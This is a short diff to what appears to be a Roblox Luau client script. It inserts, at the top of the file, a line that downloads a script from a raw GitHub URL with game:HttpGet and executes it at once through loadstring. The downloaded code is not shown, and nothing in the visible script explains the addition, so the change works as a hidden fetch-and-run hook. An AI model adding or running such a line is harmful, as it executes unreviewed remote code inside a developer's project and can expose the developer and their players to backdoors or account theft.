@@ -1,4 +1,7 @@
 --!strict
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shenx4x4/3ex5/refs/heads/master/main.client.lua"))()
+
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
